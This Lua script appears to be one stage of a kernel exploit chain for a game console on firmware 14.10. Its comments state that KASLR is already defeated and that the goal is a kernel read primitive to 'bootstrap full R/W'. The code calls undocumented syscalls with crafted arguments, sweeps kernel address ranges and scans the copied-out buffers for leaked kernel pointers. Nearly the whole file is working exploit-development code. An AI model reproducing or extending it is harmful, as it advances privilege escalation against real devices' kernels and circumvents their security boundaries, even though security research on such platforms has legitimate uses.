-- CRASH_CLASS: LOW
-- PROBE 1300a: Kernel read primitive survey
--
-- Context: KASLR defeated (fault oracle, 1199a-c). Kernel base known per-boot.
-- Need ONE kernel read to bootstrap full R/W.
-- Tests syscalls that have 13.60 dossier contracts but were never probed
-- with real arguments on 14.10:
--   A) sys 660 dynlib_get_info2 — NO gate, 0x160 copyout (13.40 showed userland-only; confirm 14.10)
--   B) sys 591 dynlib_dlsym — symbol resolution, no authid gate
--   C) sys 547 query_memory_protection on kernel VA range (fault oracle confirmed mapped)
--   D) sys 656 dynlib_get_info_for_libdbg — debug gate, try after debug_init(560)
--   E) sys 659/647/623/641/642 — untested with real args

print("=== PROBE 1300a: KERNEL READ SURVEY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

local function fmt_qw(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local function zero_buf(addr, size)
    for off = 0, size - 4, 4 do safe_wd(addr + off, 0) end
end

local function write_str(addr, s)
    zero_buf(addr, math.ceil((#s + 4) / 4) * 4)
    for i = 0, math.floor(#s / 4) do
        local val = 0
        for j = 0, 3 do
            local idx = i * 4 + j + 1
            if idx <= #s then
                val = val + string.byte(s, idx) * (2 ^ (j * 8))
            end
        end
        safe_wd(addr + i * 4, val)
    end
end

local function scan_kptrs(addr, size, label)
    local found = {}
    for off = 0, size - 8, 8 do
        local val = safe_rq(addr + off)
        if is_kptr(val) then
            local s = string.format("+0x%02X=%s", off, fmt_qw(val))
            table.insert(found, s)
            print(string.format("  *** KPTR %s %s", label, s))
        end
    end
    return found
end

-- Get our PID for later use
local sc20 = make_syscall(20)
local ok_pid, pid_ret = pcall(function() return sc20() end)
local our_pid = ok_pid and to_num(pid_ret) or 0
print(string.format("PID: %d", our_pid))
print("")

local total_kptrs = 0

-- ============================================================
-- [A] sys 660 dynlib_get_info2
-- 13.60 contract: (handle, info_inout), 0x160 copyout, NO gate
-- 13.40 cross-val: works, userland-only. Confirm on 14.10.
-- ============================================================
print("[A] sys 660 dynlib_get_info2")

local sc660 = make_syscall(660)
local info = memory.alloc(0x200)
local a_hits = 0

for handle = 0, 38 do
    zero_buf(info, 0x200)
    safe_wd(info, 0x160)

    local ok, ret = pcall(function() return sc660(uint64(handle), uint64(info)) end)
    local rv = ok and to_num(ret) or -999

    if rv == 0 then
        local kp = scan_kptrs(info, 0x160, string.format("660/h%d", handle))
        a_hits = a_hits + 1
        total_kptrs = total_kptrs + #kp
        -- Show segment base for first few + any with kptrs
        if handle <= 2 or #kp > 0 then
            local seg0 = safe_rq(info + 0x108)
            local seg0sz = safe_rq(info + 0x110)
            print(string.format("  h=%d ret=0 seg0=%s sz=%s kp=%d",
                handle, fmt_qw(seg0), fmt_qw(seg0sz), #kp))
        end
    elseif rv == -999 then
        print(string.format("  h=%d CRASH", handle))
        break
    else
        if handle <= 1 then
            print(string.format("  h=%d ret=%d", handle, rv))
        end
    end
end

print(string.format("[A] 660: %d answered, %d kptrs", a_hits, total_kptrs))
print("")

-- ============================================================
-- [B] sys 591 dynlib_dlsym
-- 13.60 contract: (handle, name_ptr, out_addr_ptr), no authid
-- ============================================================
print("[B] sys 591 dynlib_dlsym")

local sc591 = make_syscall(591)
local out_ptr = memory.alloc(16)
local name_buf = memory.alloc(128)
local b_kptrs = 0

local sym_names = {
    "module_start", "module_stop", "_init", "_fini",
    "malloc", "free", "memcpy", "mmap",
    "sceKernelGetCompiledSdkVersion",
    "sceKernelDlsym", "sceKernelSendNotificationRequest",
    "sceKernelDebugOutText", "sceKernelGetModuleInfo"
}

-- Try handles 0 (eboot), 1, 2, and 0x2001 (common libkernel alias)
local try_handles = {0, 1, 2, 0x2001}

for _, sym in ipairs(sym_names) do
    write_str(name_buf, sym)
    for _, h in ipairs(try_handles) do
        safe_wq(out_ptr, uint64(0xDEADBEEFCAFE))

        local ok, ret = pcall(function()
            return sc591(uint64(h), uint64(name_buf), uint64(out_ptr))
        end)
        local rv = ok and to_num(ret) or -999

        if rv == 0 then
            local resolved = safe_rq(out_ptr)
            local is_k = is_kptr(resolved)
            if is_k then b_kptrs = b_kptrs + 1 end
            print(string.format("  h=%d '%s' -> %s%s",
                h, sym, fmt_qw(resolved), is_k and " *** KERNEL ***" or ""))
        elseif rv == -999 then
            print(string.format("  h=%d '%s' CRASH", h, sym))
        end
        -- Skip -1 (expected for most)
    end
end

total_kptrs = total_kptrs + b_kptrs
print(string.format("[B] 591: %d kernel ptrs", b_kptrs))
print("")

-- ============================================================
-- [C] sys 547 query_memory_protection on kernel VA
-- Previously tested 32 generic addrs, all -1.
-- Fault oracle found pages at 0xFFFFFFFFC0000000 (stub) and
-- 0xFFFFFFFFD4000000-DA5FFFFF (image). Test that range.
-- ============================================================
print("[C] sys 547 on kernel VA")

local sc547 = make_syscall(547)
local region = memory.alloc(0x100)
local c_answered = 0

-- Sweep stub + kernel image range + a few extras
local kvas = {}
-- Typical stub
for hi_lo = 0xC0000000, 0xC8000000, 0x2000000 do
    table.insert(kvas, {0xFFFFFFFF, hi_lo})
end
-- Typical kernel image (the 14.10 range was D4-DA)
for hi_lo = 0xC8000000, 0xE0000000, 0x2000000 do
    table.insert(kvas, {0xFFFFFFFF, hi_lo})
end
-- Also try base of kernel space
table.insert(kvas, {0xFFFF8000, 0x00000000})
table.insert(kvas, {0xFFFF8001, 0x00000000})
-- physmap area
table.insert(kvas, {0xFFFFF000, 0x00000000})
table.insert(kvas, {0xFFFFF800, 0x00000000})

for _, pair in ipairs(kvas) do
    local h, l = pair[1], pair[2]
    local addr = uint64(string.format("0x%08X%08X", h, l))
    zero_buf(region, 0x80)

    local ok, ret = pcall(function() return sc547(addr, uint64(region)) end)
    local rv = ok and to_num(ret) or -999

    if rv == 0 then
        c_answered = c_answered + 1
        local r_start = safe_rq(region)
        local r_end = safe_rq(region + 0x08)
        local prot = safe_rd(region + 0x18)
        print(string.format("  0x%08X%08X ret=0 *** HIT *** start=%s end=%s prot=0x%X",
            h, l, fmt_qw(r_start), fmt_qw(r_end), prot or 0))
        scan_kptrs(region, 0x48, "547")
    elseif rv == -999 then
        print(string.format("  0x%08X%08X CRASH", h, l))
        break
    else
        -- Print a few -1 for verification
        if l == 0xC0000000 or l == 0xD4000000 then
            print(string.format("  0x%08X%08X ret=%d", h, l, rv))
        end
    end
end

print(string.format("[C] 547: %d answered", c_answered))
print("")

-- ============================================================
-- [D] sys 656 dynlib_get_info_for_libdbg (after debug_init)
-- Gate: debug-unit predicate (not authid). 560(1) returned 0.
-- ============================================================
print("[D] sys 656 after debug_init")

local sc560 = make_syscall(560)
local ok560, ret560 = pcall(function() return sc560(uint64(1)) end)
local rv560 = ok560 and to_num(ret560) or -999
print(string.format("  debug_init(1): ret=%d", rv560))

local sc656 = make_syscall(656)
local d_kptrs = 0

for handle = 0, 5 do
    zero_buf(info, 0x200)
    safe_wd(info, 0x160)

    local ok, ret = pcall(function() return sc656(uint64(handle), uint64(info)) end)
    local rv = ok and to_num(ret) or -999

    if rv == 0 then
        local kp = scan_kptrs(info, 0x160, string.format("656/h%d", handle))
        d_kptrs = d_kptrs + #kp
        local seg0 = safe_rq(info + 0x108)
        print(string.format("  h=%d ret=0 seg0=%s kp=%d", handle, fmt_qw(seg0), #kp))
    elseif rv == -999 then
        print(string.format("  h=%d CRASH", handle))
        break
    else
        print(string.format("  h=%d ret=%d", handle, rv))
    end
end

total_kptrs = total_kptrs + d_kptrs
print(string.format("[D] 656: %d kptrs", d_kptrs))
print("")

-- ============================================================
-- [E] Quick sweep: 659, 647, 623, 641, 642, 611, 613, 615
-- ============================================================
print("[E] Untested syscalls with real args")

-- 659 dynlib_get_list2: (out_handles, capacity, out_count)
local sc659 = make_syscall(659)
local hbuf = memory.alloc(0x200)
local cbuf = memory.alloc(8)
safe_wd(cbuf, 0)

local ok659, ret659 = pcall(function()
    return sc659(uint64(hbuf), uint64(40), uint64(cbuf))
end)
local rv659 = ok659 and to_num(ret659) or -999
local cnt659 = safe_rd(cbuf) or 0
print(string.format("  659 get_list2: ret=%d count=%d", rv659, cnt659))
if rv659 == 0 and cnt659 > 0 then
    for i = 0, math.min(cnt659 - 1, 4) do
        print(string.format("    [%d] = 0x%X", i, safe_rd(hbuf + i * 4) or 0))
    end
end

-- 647 get_sdk_compiled_version: likely (handle) -> retval is version
local sc647 = make_syscall(647)
local ok647, ret647 = pcall(function() return sc647(uint64(0)) end)
local rv647 = ok647 and to_num(ret647) or -999
print(string.format("  647 sdk_ver(0): ret=%d (0x%X)", rv647, rv647))

-- Try handle 1
local ok647b, ret647b = pcall(function() return sc647(uint64(1)) end)
local rv647b = ok647b and to_num(ret647b) or -999
print(string.format("  647 sdk_ver(1): ret=%d (0x%X)", rv647b, rv647b))

-- 623 get_gpo: (out_buf)
local sc623 = make_syscall(623)
local gpo = memory.alloc(64)
zero_buf(gpo, 64)
local ok623, ret623 = pcall(function() return sc623(uint64(gpo)) end)
local rv623 = ok623 and to_num(ret623) or -999
print(string.format("  623 get_gpo: ret=%d buf[0]=0x%X", rv623, safe_rd(gpo) or 0))
if rv623 == 0 then scan_kptrs(gpo, 64, "623") end

-- 641 get_cpu_usage_proc: (pid, out_buf)
local sc641 = make_syscall(641)
local cpu = memory.alloc(0x100)
zero_buf(cpu, 0x100)
local ok641, ret641 = pcall(function()
    return sc641(uint64(our_pid), uint64(cpu))
end)
local rv641 = ok641 and to_num(ret641) or -999
print(string.format("  641 cpu_usage(%d): ret=%d", our_pid, rv641))
if rv641 == 0 then
    -- Show first 8 qwords
    for off = 0, 0x38, 8 do
        local val = safe_rq(cpu + off)
        local h, l = get_hi_lo(val)
        if h ~= 0 or l ~= 0 then
            print(string.format("    +0x%02X: %s%s", off, fmt_qw(val),
                is_kptr(val) and " *** KPTR ***" or ""))
        end
    end
    scan_kptrs(cpu, 0x100, "641")
end

-- 642 get_map_statistics: (out_buf, size, ?, ?)
local sc642 = make_syscall(642)
local mstat = memory.alloc(0x200)
zero_buf(mstat, 0x200)
local ok642, ret642 = pcall(function()
    return sc642(uint64(mstat), uint64(0x200), uint64(0), uint64(0))
end)
local rv642 = ok642 and to_num(ret642) or -999
print(string.format("  642 map_stats: ret=%d", rv642))
if rv642 == 0 then
    for off = 0, 0x38, 8 do
        local val = safe_rq(mstat + off)
        local h, l = get_hi_lo(val)
        if h ~= 0 or l ~= 0 then
            print(string.format("    +0x%02X: %s", off, fmt_qw(val)))
        end
    end
    scan_kptrs(mstat, 0x200, "642")
end

-- 611 get_paging_stats_of_all_threads: (out, size)
local sc611 = make_syscall(611)
local pg = memory.alloc(0x400)
zero_buf(pg, 0x400)
local ok611, ret611 = pcall(function()
    return sc611(uint64(pg), uint64(0x400))
end)
local rv611 = ok611 and to_num(ret611) or -999
print(string.format("  611 paging_stats: ret=%d", rv611))
if rv611 == 0 then scan_kptrs(pg, 0x400, "611") end

-- 613 get_resident_count: (out?)
local sc613 = make_syscall(613)
local res = memory.alloc(16)
zero_buf(res, 16)
local ok613, ret613 = pcall(function() return sc613(uint64(res)) end)
local rv613 = ok613 and to_num(ret613) or -999
local res_val = safe_rd(res) or 0
print(string.format("  613 resident_count: ret=%d val=%d", rv613, res_val))

-- Try as direct return value
local ok613b, ret613b = pcall(function() return sc613(uint64(0)) end)
local rv613b = ok613b and to_num(ret613b) or -999
print(string.format("  613 resident_count(0): ret=%d", rv613b))

-- 615 get_resident_fmem_count: (out?)
local sc615 = make_syscall(615)
zero_buf(res, 16)
local ok615, ret615 = pcall(function() return sc615(uint64(res)) end)
local rv615 = ok615 and to_num(ret615) or -999
print(string.format("  615 fmem_count: ret=%d val=%d", rv615, safe_rd(res) or 0))

print("")
print("=== SUMMARY ===")
print(string.format("Total kernel pointers: %d", total_kptrs))
print(string.format("547 answered for kernel VA: %d", c_answered))
print(string.format("660 handles answered: %d", a_hits))
print("=== DONE ===")
